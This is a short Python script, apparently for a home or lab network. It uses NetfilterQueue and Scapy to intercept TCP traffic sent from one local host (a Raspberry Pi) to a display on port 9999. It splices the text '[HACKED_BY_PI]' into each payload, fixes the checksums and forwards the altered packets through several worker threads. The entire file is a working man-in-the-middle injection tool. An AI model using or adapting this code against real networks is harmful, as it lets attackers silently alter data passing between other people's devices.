#!/usr/bin/env python3
# injector_threaded.py

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
from queue import Queue
from threading import Thread
import time

# Config
PI_IP = "192.168.157.15"
DISPLAY_IP = "192.168.157.16"
TARGET_PORT = 9999
DEBUG = True
NUM_WORKERS = 4  # Số luồng xử lý song song

# Thread-safe queue
pkt_queue = Queue()

def handle_packet(pkt):
    try:
        scapy_pkt = IP(pkt.get_payload())

        if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
            ip_layer = scapy_pkt[IP]
            tcp_layer = scapy_pkt[TCP]
            payload = scapy_pkt[Raw].load

            if ip_layer.src == PI_IP and ip_layer.dst == DISPLAY_IP and tcp_layer.dport == TARGET_PORT:
                if DEBUG:
                    print(f"[+] Intercepted payload: {payload}")

                inject_text = b"[HACKED_BY_PI]\n"
                max_len = len(payload)

                cut_len = len(inject_text)
                trimmed_payload = payload[:-cut_len] if len(payload) >= cut_len else b""

                new_payload = trimmed_payload + inject_text
                scapy_pkt[Raw].load = new_payload

                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[TCP].chksum

                pkt.set_payload(bytes(scapy_pkt))
                pkt.accept()

                if DEBUG:
                    print(f"[+] Modified and forwarded.")
                return

        pkt.accept()

    except Exception as e:
        if DEBUG:
            print(f"[!] Error in thread: {e}")
        pkt.accept()

def worker():
    while True:
        pkt = pkt_queue.get()
        handle_packet(pkt)
        pkt_queue.task_done()

def process(pkt):
    pkt.retain()
    pkt_queue.put(pkt)

# Main
if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    print("[*] Starting multi-threaded packet handler...")

    # Start worker threads
    for _ in range(NUM_WORKERS):
        Thread(target=worker, daemon=True).start()

    try:
        nfqueue.bind(1, process)
        print("[*] Waiting for packets... Press Ctrl+C to stop.")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[!] Detected Ctrl+C, exiting.")
    finally:
        nfqueue.unbind()
